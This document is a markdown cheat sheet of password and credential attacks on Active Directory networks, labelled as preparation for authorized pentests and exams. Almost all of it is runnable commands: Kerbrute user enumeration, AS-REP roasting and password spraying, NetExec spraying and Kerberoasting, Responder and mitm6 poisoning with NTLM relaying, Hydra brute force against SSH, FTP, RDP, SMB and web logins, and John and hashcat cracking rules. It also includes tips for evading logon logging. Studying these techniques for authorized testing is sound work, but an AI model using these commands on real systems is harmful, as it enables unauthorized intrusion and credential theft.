# Password Attacks — Advanced Toolkit (2026)

*Beyond basic hashcat mode usage (see CHEATSHEET.md §4 for the mode-number reference). For authorized pentest/exam prep only.*

Modern AD-focused engagements favor unauthenticated Kerberos pre-auth abuse over noisy SMB/LDAP binds, since Kerberos pre-auth failures are timed/logged differently and don't always burn the bad-password counter the same way.

---

## Kerbrute — unauthenticated domain user enumeration & spraying

Abuses Kerberos AS-REQ pre-auth responses: `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` = user doesn't exist; pre-auth-required response = valid username. No Windows 4625 failed-logon event is generated.

```bash
# User enumeration
./kerbrute userenum -d corp.local --dc 192.168.56.101 usernames.txt -o valid_users.txt

# AS-REP roasting sweep — kerbrute has no dedicated 'asreproast' subcommand; userenum's
# --hash-file flag captures hashcat-crackable AS-REP (mode 18200) for any account with preauth disabled
./kerbrute userenum -d corp.local --dc 192.168.56.101 users.txt --hash-file asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule
# Alternatives: Impacket's GetNPUsers.py, or nxc's --asreproast flag (see NetExec section below)

# Password spraying via Kerberos pre-auth — faster/quieter than SMB/LDAP binds,
# but STILL counts against lockout policy; --safe aborts on lockout signal
./kerbrute passwordspray -d corp.local --dc 192.168.56.101 valid_users.txt 'Summer2026!' --safe
```
**Reference:** https://github.com/ropnop/kerbrute

## NetExec (nxc) — CrackMapExec successor (CME is archived/unmaintained — use nxc, not cme)

```bash
pipx install git+https://github.com/Pennyw0rth/NetExec

# SMB password spraying, safe defaults
nxc smb 10.10.10.0/24 -u users.txt -p 'Summer2026!' --continue-on-success
nxc smb DC01.corp.local -u users.txt -p creds.txt --no-bruteforce --continue-on-success   # 1-to-1 pairing, avoids lockouts
nxc smb DC01.corp.local -u administrator -p 'pass' --local-auth   # local (non-domain) accounts

# LDAP-based roasting once you hold any valid domain credential
nxc ldap DC01.corp.local -u lowpriv -p 'Passw0rd!' --asreproast asrep_out.txt      # hashcat mode 18200
nxc ldap DC01.corp.local -u lowpriv -p 'Passw0rd!' --kerberoasting kerberoast_out.txt  # hashcat mode 13100
```
**Reference:** https://github.com/Pennyw0rth/NetExec · https://www.netexec.wiki/

## Responder / mitm6 — network hash capture (LLMNR/NBT-NS/mDNS + IPv6 DNS takeover)

Captures Net-NTLMv2 challenge/response hashes from broadcast name-resolution traffic without needing any prior credential — often the very first crackable hash on an internal AD assessment.
```bash
# Responder — poison LLMNR/NBT-NS/mDNS, log Net-NTLMv2 to /usr/share/responder/logs/
sudo responder -I eth0 -wrf

# mitm6 — IPv6 DNS takeover, forces Windows hosts to prefer attacker as DNS/WPAD over IPv6
sudo mitm6 -d corp.local
# pair with ntlmrelayx to relay the captured auth instead of just logging it
sudo ntlmrelayx.py -6 -t ldaps://192.168.56.101 -wh fakewpad.corp.local -l loot

# Crack captured Net-NTLMv2 hashes offline
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```
**Reference:** https://github.com/lgandx/Responder · https://github.com/dirkjanm/mitm6

## Hydra — service-specific brute force

Target syntax: `service://host[:port]/params`, or classic `-l/-L -p/-P host service`.
```bash
# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5 -t 4 -f -V

# FTP
hydra -L users.txt -P passwords.txt ftp://10.10.10.5 -t 4 -f

# RDP (fragile module — keep -t low, expect false negatives)
hydra -L users.txt -P passwords.txt rdp://10.10.10.5 -t 1 -f

# SMB
hydra -l admin -P wordlist.txt smb://10.10.10.5 -t 4 -f -V

# HTTP POST login form (F= marks a failure string to match on)
hydra -l admin -P passwords.txt 10.10.10.5 http-post-form \
  "/login.php:username=^USER^&password=^PASS^&submit=Login:F=incorrect password"
```
`hydra -U <module>` prints module-specific optional parameters before crafting an attack string.
**Reference:** https://github.com/vanhauser-thc/thc-hydra

## John the Ripper — rule-based mutation attacks

Rules live in `john.conf` under `[List.Rules:Name]`. Rule-based mutation dramatically outperforms raw wordlist attacks against real-world AD dumps.
```bash
john --wordlist=rockyou.txt --rules=KoreLogicRules hashes.txt
john --format=NT --wordlist=rockyou.txt --rules=Jumbo hashes.txt
john --show hashes.txt
```
**Reference:** https://www.openwall.com/john/doc/RULES.shtml

### OneRuleToRuleThemAll — highest-yield general-purpose rule file

Built from the top-25%-performing rules of best64, KoreLogic Rockyou50000, dive, T0XICv1, InsidePro, etc. Compatible with both John and Hashcat rule syntax.
```bash
# Hashcat (faster, GPU) — most common OSCP workflow for NTLM/roasted hashes
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule

# John (paste rule text into a [List.Rules:OneRule] section of john.conf)
john --wordlist=rockyou.txt --rules=OneRule hashes.txt
```
**Reference:** https://github.com/NotSoSecure/password_cracking_rules

---

## Tools Reference

| Name | URL |
|---|---|
| Kerbrute | https://github.com/ropnop/kerbrute |
| NetExec (nxc) | https://github.com/Pennyw0rth/NetExec (docs: https://www.netexec.wiki/) |
| Responder | https://github.com/lgandx/Responder |
| mitm6 | https://github.com/dirkjanm/mitm6 |
| CrackMapExec (legacy, archived — do not use) | https://github.com/byt3bl33d3r/CrackMapExec |
| THC-Hydra | https://github.com/vanhauser-thc/thc-hydra |
| John the Ripper (jumbo) | https://github.com/openwall/john |
| OneRuleToRuleThemAll | https://github.com/NotSoSecure/password_cracking_rules |
| Hashcat | https://hashcat.net/hashcat/ |
